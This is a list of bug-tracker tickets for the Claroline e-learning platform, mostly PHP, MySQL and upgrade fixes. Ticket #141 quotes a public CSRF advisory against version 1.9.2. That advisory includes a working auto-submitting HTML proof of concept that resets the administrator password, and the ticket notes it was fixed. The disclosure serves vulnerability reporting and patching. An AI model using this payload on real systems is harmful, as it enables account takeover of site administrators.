subject: claroline
title: #337 HTML message bar not fully compatible with the Console API
description:
The message types accepted by the console API are not the same as the one accepted by the claro_html_msg_list() function. This causes Array to String conversion errors to be raised.

Fixed in rev14903 on the trunk (1.12), not fixed in other versions

subject: claroline
title: #336 MEMORY LEAK in delete_course()
labels:
fatal error (3)
          
        
          
              kernel (34)
          
        
          
              infinite loop (1)
          
        
          
              memory leak (1)
description:
Deleting a course consumes all the memory available for PHP while seraching for non deleted tables in signle database mode.

This is due to the fact that the while loop check for the next result in the database resultset to be false to exit the loop. But since we have moved to mysqli, ths empty result in a resultset is NULL and not FALSE, causing the loop to never stop and to consume all the memory available.

Solution : use claro_sql_fetch_all_rows !

Fix on the trunk in rev14902

subject: claroline
title: #333 Undefined index notification when crating a session course
description:
Undefined index notification when crating a session course.

Stack trace :

( ! ) Notice: Undefined index: versionDb in /var/www/claroline/claroline/inc/lib/add_course.lib.inc.php on line 438
Call Stack

Time Memory Function Location

1 0.0000 245768 {main}( ) ../create.php:0
2 0.0231 1882200 ClaroCourse->save( ) ../create.php:96
3 0.1740 1888968 register_course( ) ../claroCourse.class.php:263
( ! ) Notice: Undefined index: clarolineVersion in /var/www/claroline/claroline/inc/lib/add_course.lib.inc.php on line 439
Call Stack

Time Memory Function Location

1 0.0000 245768 {main}( ) ../create.php:0
2 0.0231 1882200 ClaroCourse->save( ) ../create.php:96
3 0.1740 1888968 register_course( ) ../claroCourse.class.php:263
• status: open --> closed

This bug is due to a variable scope issue under PHP 5.5. The installer has been fixed in rev14884, but this will not change the existing file on the disk.

The only solution is to edit the platform/currentVersion.inc.php and replace $versionDb with $GLOBALS['versionDb'] and $clarolineVersion with $GLOBALS['clarolineVersion'].

I will check the upgrade script to see if we can solve that issue when upgrading the platform.

subject: claroline
title: #318 mysql_ functions are deprecated
description: In PHP 5.5, the mysql extension is deprecated and the mysqli extension should be used instead.

I have used the following script https://wikis.oracle.com/display/mysql/Converting+to+MySQLi (+ see attachment) to convert from mysql to mysqli in Claroline and this seems to work fine.

I think this need some more testing before an official release.
The testing package is there https://sourceforge.net/projects/claroline/files/Claroline/Claroline_1.11_mysqli_preview

Most of the testing has been done. The install and upgrade are working. The changes have been commited to the trunk and a backup copy has been done.

Modules that uses mysql_ function need to be adapted now using the mysqli_converter script.

Maybe this should be released as claroline 1.12.0 instead of claroline 1.11.9 ?

• status: open --> closed
  • Group: claroline_1.11 --> claroline_1.12
fixed on the trunk (will be released in claroline 1.12)

subject: claroline
title: #296 Error after adding a course (Italian localization)
description:
I have installed claroline on localhost:

  • Windows 7 x64
  • Apache 2.2.17
  • Php 5.3.5
  • MySql mysqlnd 5.0.7-dev - 091210 - $Revision: 304625 $
  • database charset: utf8-default-collation
  • Installation language: Italian
  • Main language: Italian

I got the following error after adding a course.
The problem is in the character 'ì' in "Mercoledì" (-> Wednesday)
in the format of date (Mercoledì 19 Dicembre 2012)

Note 1:
the course has been added correctly
the problem seems to be in the message for the administrator.

Note 2:
I re-insalled claroline with:
- Installation language: English
- Main language: English
and all works correctly

thanks in advance
Boris

Fatal error: Uncaught exception 'Exception' with message '1366:Incorrect string value: '\xEC 19 D...' for column 'message' at row 1' in D:\hosting\loc\test\www\claroline\messaging\lib\recipient\recipientlist.lib.php:134
Stack trace:
- 0 D:\hosting\loc\test\www\claroline\messaging\lib\recipient\recipientlist.lib.php(59): RecipientList->addMessage(Object(MessageToSend))
- 1 D:\hosting\loc\test\www\claroline\inc\lib\claroCourse.class.php(1323): RecipientList->sendMessage(Object(MessageToSend))
- 2 D:\hosting\loc\test\www\claroline\course\create.php(102): ClaroCourse->mailAdministratorOnCourseCreation('Boris', 'Sclauzero', 'boris@localhost...')
- 3 {main}
thrown in D:\hosting\loc\test\www\claroline\messaging\lib\recipient\recipientlist.lib.php on line 134

I discovered that the localization files have been saved using ANSI encoding.
I opened the files with notepad and I saved them using UTF-8 encoding
- complete.lang.php
- install.lang.php
- locale_settings.php
- missing.install.lang.php
- missing.lang.php

The problem has been solved

I hope this can be useful
Thanks
Boris

Note:
It's also necessary to declare:
$charset = 'utf-8';
in "locale_settings.php"
Boris

 

Last edit: Boris 2012-12-19

Error in: complete.lang.php (Italian localization)
Replace: %course_category
With: %course_categories

subject: claroline
title: #291 version number upgrade 1.9.* to 1.11
description:
Issues with version numbers when upgrading 1.9 to 1.11 :
- Upgrade tool records 1.10 as new version number for courses (table cl_cours) instead of 1.11 and thus upgrade_conf restarts at the end of the process
- Upgrade tool checks dbversion 1.10 against new platform version 1.11 and thus "Upgrade done" is never accessed
- "upgrade done message" says new version is 1.10
Suggestion: maybe it would be better to add a specific upgrade procedure for 1.9 to 1.11 instead of mixing 1.10 and 1.11. Even if db version are the same for 1.10 and 1.11, it would be less confusing for platform administrators

title: #278 Course creator not enrolled if enrollment not allowed
description: A course creator cannot be enrolled in his own course when enrollment are not allowed in this course...
fixed on 1.11 trunk : add method to force Super User mode in CourseUserRegistration in order to allow a course creator to be registered in his own course... rev 14041

subject: claroline
title: #277 course list does not take visibility into account
description: The Course list view does not take the visibility of a course into account.
fixed : rev 13995

subject: claroline
title: #276 visibility has no effect
description: A course always appears in courselist or in search result whenever it is invisible or not

subject: claroline
title: #275 Lang selector in course property
description: The lang selector in course properites displays only the platform default language
The configuration of the platform should accept au default value 'all' for 'multi' configuration variable type.
change priority...
it's not a bug but a new configuration in the course options

subject: claroline
title: #274 count group members returns a wrong value
description: The group_count_students_in_groups and group_count_students_in_group functions return a wrong value by counting not only the group members which are currently enrolled in a course, but also those who were enrolled in the past. As a consequence, it's not possible to subscribe to a group if more than maxMember users have been registered in the past.
Fix on trunk (rev 13984), 1.10 (rev 13985) and 1.9 (rev 13986).

subject: claroline
title: #273 Cannot change login and password at the same time
description: It's not possible to change the login and the password at the same time in user profile.
Fixed in trunk (rev. 13979), 1.10 (rev. 13980) and 1.9 (rev. 13981)

subject: claroline
title: #272 Tooltitle command list does not allow switches
description: The tooltitle command list implementation does not allow to display "switches" (ie.: commands which can be active only one at a time for example user add/user search).
This can be acheived by handling commands with null as URL

subject: claroline
title: #271 enrollment_date never set in database
description: The enrollment_date column in the user course enrollment table is never set which make it completely useless.
fixed on trunk only rev 13966

subject: claroline
title: #270 configuration : Min instead of min in CLUSR config
description: The minimum accepted value for the number of users to display in the user list is set using 'Min' instead of 'min'. This cause the condition to be ignored by the platform when validating the given value.
fixed in 1.10 by rev 13964 and on the trunk by rev 13965

subject: claroline
title: #269 configuration : wrong integer validation
description: If the empty "" value is given instead of an integer, the configuration validator fails to validate the entry and generates a configuration file with a parse error.
The malformed configuration file crashes the platform !
fixed in 1.10 by rev 13964 and on the trunk by rev 13965

subject: claroline
title: #268 Cannot change password if username not editable
description: It's impossible for a user to change his password if he cannot also edit his username.
Fixed rev 13962 (trunk) and rev 13963 (1.10 branch)

subject: claroline
title: #267 Broken category browser
description: The category browser does not work anymore for anonymous users
Fixed on the svn repository (will be fixed in the next release) - trunk rev.13940

subject: claroline
title: #266 Course manager loses his rights
description:
Access rights to tools: when a course manager clicks in the "Manager"'s column, he deletes his own access right to the tool (the clicked line disapears) and can't retrieve it without a platform admin.

Informations (french) and screenshots: http://forum.claroline.net/viewtopic.php?f=84&t=24406&p=56632#p56632
Snapshot

subject: claroline
title: #265 Impossible to quote a post containing a quote in the forum
description: If you try to quote a post containing a quote in the forum, you get a "Not allowed" error.

The cause: when you quote a message, your new message is not considered as a "reply", but like a "quote", which seems to be a special type of reply and isn't processed the same way, leading to a record in database containing "0" in the field "forum_id" (c.f. COURSE_bb_posts table).

When you quote a message which forum_id value is "0", that produces an error: the post you try to quote doesn't belong to any forum, so you are not allowed to quote it.

Fixed in revision 13588.

subject: claroline
title: #264 libnotify SQL error in multiple-db install
description: The notify library generates SQL errors when inserting calendar events in multiple database mode due to missing backticks around table names in SQL queries.
fixed in rev 13431

subject: claroline
title: #263 Tab session separated from course banner in IE
description: Blank space between tab session en course banner.

subject: claroline
title: #262 Can't access table course in multi db / student status
description:
checked in MULTIDB

1142 : SELECT command denied to user 'lab'@'localhost' for table 'course_properties'

SELECT name, value
FROM `c_GASTR001`.`course_properties`
WHERE category = 'MAIN'
We don't manage to reproduce this on another campus installed in multiple database mode. Isn't it a issue with the user righte in the database ? Maybe the tables needs to be repaired ?
bug disappear after reinstallation

subject: claroline

subject: claroline
title: #250 Wrong MySQL version check in the pre-install recap
description:
The MySQL version check displayed on the pre-install recap board isn't right: it show KO even when the current version meets the requirements.
E.g.: my current MySQL version is 5.1.54, and Claroline requires a version >= 4.3. The version test doesn't pass. BUT the installation goes well though (that's why it's a low priority bug).

Fixed in 1.11 (trunk): see revision 13460.

Replace an empty var $client_ver with mysql_get_client_info(), to finaly display the right MySQL version (and the proper version check result) in the pre-install recap. Hope this function works fine with other systems (tested with Ubuntu 11.04 - what about Windows and OS X ? Please let me know: antonin.bourguignon@claroline.net).

See Fix.png.

subject: claroline
title: #235 Several display bugs in IE 8+
description: First char of admin menu not displayed in IE 8, 9, tested on 1.10.4 and trunk.
Please, join a screenshot...
blue line under header
blank zone in course list of the deskptop
blank line in the session bar
not alignment when a notification is in the menu

The problem came from an HTML comment misplaced in the code.
This comment appeared before the doctype and made IE render the HTML page in quirks mode.

Solved by moving this HTML comment (containing the SVN hook $Id$) further in the code.

subject: claroline
title: #219 Missing garbage collector for temporary files
description:
The generation of temporary zip files in CLDOC and other tools creates a lot of temporary files that can consume a lot of disc space (and I really mean A LOT : if you are not aware of it this could consume all the available space !) . The current implementation does not remove those temporary files correctly and the temp files needed to be removed manually and/or by using cron.

For example :

$ cd PATH_TO_YOUR_CLAROLINE/courses
$ find * -wholename '*/tmp/*.zip' -type f -exec rm {} \;

I strongly suggest to add a garbage collector library to the file system API of Claroline 1.9 and 1.10 to correct this issue. In addition it could be apply to all the temporary files of the platform which are nearly never deleted.
fixed on svn trunk and 1.9 branch

subject: claroline
title: #212 Course category tree broken when no course
description: The course category tree is broken when there is no course in a category it is then impossible to navigate to the parent category. This is due to the WHERE condition that excludes the inactive or expired courses. This condition prevent the empty categories from appearing in the SQL result set.
The fix consists in moving the exclusion of expired or inactive courses to the JOIN condition instead of the WHERE condition.

subject: claroline
title: #188 Kernel not compatible with E_STRICT
description:
The kernel crashes in several places when E_STRICT mode is enabled in error_reporting. The main issues are :

- DEPRECATED usage of some functions like mktime
- call to static methods which are NOT declared static

This requires to check and clean up the code.

A automated build process should be created to check this issue. This can be acheived by calling php from the command line with the following arguments :

$ php -d error_reporting=4095 -l script_to_check.php

The reported errors should be considered as warning and logged into a file so they can be fixed in the future.

The same occurs with PHP 5.3 E_DEPRECATED error level.

subject: claroline
title: #187 The Installer MUST NOT depend on kernel
description:
The Claroline Installer MUST NOT depend on the Claroline kernel to install the platform.

At this time the installer depends on :

- 'lib/claro_main.lib.php'; // and by including this one, the insteller depends on nearly all the Claroline API !!!!!
- 'lib/user.lib.php'; // needed fo generate_passwd()
- 'lib/config.lib.inc.php';
- 'lib/form.lib.php';
- 'lib/course.lib.inc.php';
- 'lib/language.lib.php';
- 'lib/module.lib.php';
- 'lib/module/manage.lib.php';
- 'lib/right/right_profile.lib.php';
- '/lib/right/profileToolRight.class.php';

To solve this, the installer should use only PHP standard classes and functions or external third party libraries. To achieve that, the installer should only execute static SQL and PHP script (this is just file creation and database creation and fill) since installing Claroline is mainly creating a skeleton ! Achieving this could allow us to create a PHAR package for Claroline and to merge the installer with the upgrader. This will also allow us to write the installer/upgrader so it can be run from the command line and then provide a more easy way to distribute Claroline as a package for the major Linux distributions.

At least, the Installer MUST NOT depend on the claro_sql API or Claro_Database_Connection class !

subject: claroline
title: #159 Filtering url institution failed
description:
Il me semble avoir trouvé un bug dans la procedure d'installation de 1.9.3.
L'URL de l'institution est refusée

Il me semble que c'est la regexp de la ligne 293 du fichier install/index.php
qui ne va pas : elle est encadrée par des slashs, et elle en contient.

$regexp ="/^(http|https|ftp)\:// .... /? $/i";

Ca passe si on encadre par des ";" (non utilisés dans la regexp)

$regexp =";^(http|https|ftp)\:// .... /? $;i";

il y a a probablement le même problème ligne 502 de claroCourse.class.php
dans la
function validateExtLinkUrl ()
(qui fait d'ailleurs la même chose)
trouvé à grand coups de rgrep -R "//" claroline193 | grep regexp

Il me semble que le probleme a été introduit lors du remplacement de quelques eregi() - utilisés en 1.9.2-
par preg_match, dans la fonction

# rgrep -R preg_match claroline192 | wc -l
238
# rgrep -R eregi claroline192 | wc -l
67

# rgrep -R preg_match claroline193 | wc -l
262
# rgrep -R eregi claroline193 | wc -l
44

$ rgrep -R preg_match . | wc -l
500

If the cause is confirmed, there are other potential bugs with preg_match() in

- claroline193/claroline/inc/lib/fileManage.lib.php:168,
- claroline193/claroline/inc/lib/fileManage.lib.php:214
and
- claroline193/claroline/inc/lib/claroCourse.class.php:502

A somewhat related issue : the regexp allows only toplevel name domains with 1-3 letters
[a-zA-Z0-9]{1,3}
which causes rejection of official toplevel domains :aero, coop, info, museum, name, ...

(see http://en.wikipedia.org/wiki/List_of_Internet_top-level_domains\)

and of course private domainnames (eg. localdomain, intranet, local, whatever)

subject: claroline
title: #141 CSRF in adminprofile.php
description:
De : Anonymous [mailto:sks999@gmail.com]
Envoyé : mardi 15 septembre 2009 9:14
À : info@claroline.com
Objet : CSRF Vulnerability in Claroline 1.9.2

Pentest Information

Anonymous discovered a Cross Site Request Forgery in Claroline.
An attacker is able to change passwords.

Details

Application name: ClarolinePentest Information

Anonymous discovered a Cross Site Request Forgery in Claroline.
An attacker is able to change passwords.

Details

Application name: Claroline
Application version: 1.9.2
Vendor's Page: http://claroline.net/
Attack Type: Cross-Site-Request-Forgery
Risk: Medium

Advisory-Status: public

Info

Claroline is an Open Source eLearning and eWorking platform
allowing teachers to build effective online courses and to manage
learning and collaborative activities on the web. Translated into 35 languages,
Claroline has a large worldwide users’ and developers’ community.
(From the vendor's page)

Description

An attacker is able to send Cross Site Requests over the victims browser.
Due to a lack of Input-Validation, the origin of a request isn't checked properly.
An attacker ist able to change member/admin passwords.

POC

Vulerable File: claroline/claroline/admin/adminprofile.php

<html>
<head></head>
<body onLoad="javascript:document.form.submit\(\)">

<form action="http://127.0.0.1/claroline/claroline/admin/adminprofile.php" method="POST" name="form" enctype="multipart/form-data"> <input type="hidden" name="cmd" value="registration"> <input type="hidden" name="claroFormId" value=""> <input type="hidden" name="uidToEdit" value="1"> <input type="hidden" name="lastname" value="owned"> <input type="hidden" name="firstname" value="owned"> <input type="hidden" name="officialCode" value=""> <input type="hidden" name="username" value="admin"> <input type="hidden" name="password" value="123"> <input type="hidden" name="password\_conf" value="123"> <input type="hidden" name="email" value="rick@astley.com"> <input type="hidden" name="phone" value=""> <input type="hidden" name="isCourseCreator" value="1"> <input type="hidden" name="is\_admin" value="1"> <input type="hidden" name="applyChange" value="Ok"> </form>

</body>
</html>

Fix

No fix available. Don't click any links while beeing logged in at the page.
Application version: 1.9.2
Vendor's Page: http://claroline.net/
Attack Type: Cross-Site-Request-Forgery
Risk: Medium

Advisory-Status: public

The fix will be available in Claroline 1.9.3, the individual files can be downloaded from SVN :

http://claroline.svn.sourceforge.net/viewvc/claroline/branches/1.9/claroline/admin/adminprofile.php
http://claroline.svn.sourceforge.net/viewvc/claroline/branches/1.9/claroline/inc/claro_init_global.inc.php
http://claroline.svn.sourceforge.net/viewvc/claroline/branches/1.9/claroline/inc/lib/user.lib.php
Fixed on SVN

subject: claroline
title: #132 Issue with current node in bread crumbs
description: $noPHP_SELF and $noQUERY_STRING are ignored !

Solution :

Use ClaroBreadCrumbs::getInstance()->setCurrentNode( $name, $url ) instead with the following values for parameters :

- $name : $nameTools
- $url
- if $noPHP_SELF == true : null
- if $noQUERY_STRING == true : $_SERVER['PHP_SELF']
- else (i.e. $noPHP_SELF == false && $noQUERY_STRING == false, which is the default ) : $_SERVER['PHP_SELF'] .'?'. htmlspecialchars(strip_tags($_SERVER['QUERY_STRING']));
For $url you can now use php_self() and page_uri()

title: #55 Loop over all courses takes too long

subject: claroline
title: #41 [CRITICAL] User account collision on user update
description:
THIS BUG IS BLOCKING FOR CLAROLINE 1.9 STABLE RELEASE !!!
----

When several users connect from the same computer at the same time with the same browser session a user account collision occurs leading to a collision between the accounts of the users.

The consequences are dramatic :

- the account from one user are overwritten with the data of an other one
- the course list of one user are replaced by the other one

This is both a critical bug and security issue !!!

Some fixes have been added to the authentication process to avoid this issue but this is not sufficient ! When need to rework the Kernel workflow to unset the current user account anytime a login and a password are provided !

We need to move the auth process outside the kernel to avoid it from being called on each page !
Only the login.php script should be allowed to call the authentication process !

This refactoring will probably take several weeks to be achieved.

----

subject: claroline
title: #6 Disk space quota and file size limit
description:
The document disk space quota must be the one for an entire course, not only the documents folder. The same must applies to the file size limit.

This quota must be used in addition to more specific quotas and file size limit. These more specific values must be lesser than the course ones.

subject: claroline

description:
If there is a double dot in a file name, the protect path function will remove it and generate an invalid file path.

For example "test..html" will be replaced with "testhtml".

This issue occurs when renaming a file in the Documents tool.

Additional question : Why allowing to change the extension when renaming a file ?
normaly solved on svn
